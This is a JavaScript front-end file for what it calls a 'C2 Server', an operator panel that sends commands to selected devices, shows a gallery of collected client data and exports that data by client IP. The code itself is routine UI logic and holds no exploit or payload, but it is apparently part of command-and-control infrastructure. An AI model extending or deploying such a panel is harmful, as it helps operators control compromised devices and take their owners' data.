// Main JavaScript for C2 Server

// Global variables
let currentClient = null;
let autoRefreshInterval = null;

// Initialize when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
    initializeTooltips();
    initializeAutoRefresh();
    setupEventListeners();
});

// Initialize Bootstrap tooltips if using Bootstrap
function initializeTooltips() {
    const tooltips = document.querySelectorAll('[data-toggle="tooltip"]');
    tooltips.forEach(tooltip => {
        // You can add tooltip initialization here if using a library
    });
}

// Auto-refresh functionality
function initializeAutoRefresh() {
    const refreshToggle = document.getElementById('autoRefresh');
    if (refreshToggle) {
        refreshToggle.addEventListener('change', function() {
            if (this.checked) {
                startAutoRefresh();
            } else {
                stopAutoRefresh();
            }
        });
    }
}

function startAutoRefresh() {
    if (autoRefreshInterval) clearInterval(autoRefreshInterval);
    autoRefreshInterval = setInterval(() => {
        refreshData();
    }, 30000); // Refresh every 30 seconds
}

function stopAutoRefresh() {
    if (autoRefreshInterval) {
        clearInterval(autoRefreshInterval);
        autoRefreshInterval = null;
    }
}

function refreshData() {
    // Reload current page data without full refresh
    const currentPath = window.location.pathname;
    if (currentPath === '/') {
        loadDashboardData();
    } else if (currentPath === '/gallery') {
        loadGalleryData();
    }
}

function loadDashboardData() {
    showLoading();
    fetch('/api/dashboard-data')
        .then(response => response.json())
        .then(data => {
            updateDashboard(data);
            hideLoading();
        })
        .catch(error => {
            console.error('Error loading dashboard:', error);
            hideLoading();
            showNotification('error', 'Failed to load dashboard data');
        });
}

function loadGalleryData() {
    showLoading();
    fetch('/api/gallery-data')
        .then(response => response.json())
        .then(data => {
            updateGallery(data);
            hideLoading();
        })
        .catch(error => {
            console.error('Error loading gallery:', error);
            hideLoading();
            showNotification('error', 'Failed to load gallery data');
        });
}

// Command functions
function sendCommand() {
    const deviceId = document.getElementById('deviceSelect')?.value;
    const command = document.getElementById('commandSelect')?.value;
    const paramsInput = document.getElementById('paramsInput')?.value;

    if (!deviceId || !command) {
        showNotification('warning', 'Please select device and command');
        return;
    }

    let params = {};
    if (paramsInput) {
        try {
            params = JSON.parse(paramsInput);
        } catch(e) {
            showNotification('error', 'Invalid JSON params');
            return;
        }
    }

    const commandBtn = document.getElementById('sendCommandBtn');
    const originalText = commandBtn.innerHTML;
    commandBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
    commandBtn.disabled = true;

    fetch('/commands', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            device_id: deviceId,
            command: command,
            params: params
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.command_id) {
            showNotification('success', `Command sent! ID: ${data.command_id}`);
            // Log to command history
            addToCommandHistory(deviceId, command, params, data.command_id);
        } else {
            showNotification('error', 'Failed to send command');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        showNotification('error', 'Error sending command');
    })
    .finally(() => {
        commandBtn.innerHTML = originalText;
        commandBtn.disabled = false;
    });
}

// Gallery tab switching
function showTab(tabId, button) {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });

    // Show selected tab
    const tabElement = document.getElementById(tabId);
    if (tabElement) {
        tabElement.classList.add('active');
    }

    // Update button states
    document.querySelectorAll('.tab').forEach(btn => {
        btn.classList.remove('active');
    });
    if (button) {
        button.classList.add('active');
    }
}

// Gallery tab switching (new version)
function switchGalleryTab(clientId, tabName) {
    // Hide all tabs for this client
    document.querySelectorAll(`[id^="${clientId}-"]`).forEach(tab => {
        tab.classList.remove('active');
    });

    // Show selected tab
    const selectedTab = document.getElementById(`${clientId}-${tabName}`);
    if (selectedTab) {
        selectedTab.classList.add('active');
    }

    // Update tab buttons
    document.querySelectorAll(`[data-client="${clientId}"]`).forEach(btn => {
        btn.classList.remove('active');
        if (btn.getAttribute('data-tab') === tabName) {
            btn.classList.add('active');
        }
    });
}

// Notification system
function showNotification(type, message) {
    const notificationContainer = document.getElementById('notificationContainer');
    if (!notificationContainer) {
        // Create notification container if it doesn't exist
        const container = document.createElement('div');
        container.id = 'notificationContainer';
        container.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
        `;
        document.body.appendChild(container);
    }

    const notification = document.createElement('div');
    notification.className = `alert alert-${type}`;
    notification.innerHTML = `
        <i class="fas ${getIconForType(type)}"></i>
        <span>${message}</span>
        <button type="button" class="close-btn" onclick="this.parentElement.remove()">
            <i class="fas fa-times"></i>
        </button>
    `;

    notification.style.cssText = `
        background: white;
        border-left: 4px solid ${getColorForType(type)};
        border-radius: 4px;
        padding: 12px 20px;
        margin-bottom: 10px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        display: flex;
        align-items: center;
        gap: 10px;
        animation: slideIn 0.3s ease;
    `;

    document.getElementById('notificationContainer').appendChild(notification);

    // Auto-remove after 5 seconds
    setTimeout(() => {
        if (notification.parentElement) {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }
    }, 5000);
}

function getIconForType(type) {
    switch(type) {
        case 'success': return 'fa-check-circle';
        case 'warning': return 'fa-exclamation-triangle';
        case 'error': return 'fa-times-circle';
        default: return 'fa-info-circle';
    }
}

function getColorForType(type) {
    switch(type) {
        case 'success': return '#27ae60';
        case 'warning': return '#f39c12';
        case 'error': return '#e74c3c';
        default: return '#3498db';
    }
}

// Command history
function addToCommandHistory(deviceId, command, params, commandId) {
    const historyList = document.getElementById('commandHistory');
    if (!historyList) return;

    const entry = document.createElement('div');
    entry.className = 'command-history-item';
    entry.innerHTML = `
        <div class="command-time">${new Date().toLocaleTimeString()}</div>
        <div class="command-details">
            <strong>${deviceId}</strong> - ${command}
            ${Object.keys(params).length ? `<br><small>${JSON.stringify(params)}</small>` : ''}
        </div>
        <div class="command-status">
            <span class="badge badge-warning">Pending</span>
        </div>
    `;

    historyList.insertBefore(entry, historyList.firstChild);

    // Store command ID for status tracking
    entry.setAttribute('data-command-id', commandId);
}

// Loading indicators
function showLoading() {
    const loader = document.getElementById('globalLoader');
    if (loader) {
        loader.style.display = 'flex';
    } else {
        const loader = document.createElement('div');
        loader.id = 'globalLoader';
        loader.innerHTML = '<div class="spinner"></div>';
        loader.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;
        document.body.appendChild(loader);
    }
}

function hideLoading() {
    const loader = document.getElementById('globalLoader');
    if (loader) {
        loader.style.display = 'none';
    }
}

// Search/filter functionality
function filterClients(searchTerm) {
    const clientCards = document.querySelectorAll('.client-card');
    searchTerm = searchTerm.toLowerCase();

    clientCards.forEach(card => {
        const clientName = card.querySelector('.client-header h3').textContent.toLowerCase();
        if (clientName.includes(searchTerm)) {
            card.style.display = 'block';
        } else {
            card.style.display = 'none';
        }
    });
}

// Export data functions
function exportClientData(clientIp, dataType) {
    window.location.href = `/export/${clientIp}/${dataType}`;
}

function downloadAllData(clientIp) {
    window.location.href = `/download-all/${clientIp}`;
}

// Setup event listeners
function setupEventListeners() {
    // Search input
    const searchInput = document.getElementById('clientSearch');
    if (searchInput) {
        searchInput.addEventListener('input', (e) => filterClients(e.target.value));
    }

    // Command form parameters toggle
    const commandSelect = document.getElementById('commandSelect');
    if (commandSelect) {
        commandSelect.addEventListener('change', function() {
            const paramsDiv = document.getElementById('paramsDiv');
            const hasParams = this.selectedOptions[0]?.getAttribute('data-has-params') === 'true';
            paramsDiv.style.display = hasParams ? 'block' : 'none';
        });
    }

    // Refresh button
    const refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) {
        refreshBtn.addEventListener('click', () => refreshData());
    }

    // Keyboard shortcuts
    document.addEventListener('keydown', function(e) {
        // Ctrl/Cmd + R to refresh (prevent browser refresh)
        if ((e.ctrlKey || e.metaKey) && e.key === 'r') {
            e.preventDefault();
            refreshData();
        }

        // Escape to close modals
        if (e.key === 'Escape') {
            closeAllModals();
        }
    });
}

// Modal functions
function openModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
    }
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
}

function closeAllModals() {
    document.querySelectorAll('.modal').forEach(modal => {
        modal.style.display = 'none';
    });
    document.body.style.overflow = 'auto';
}
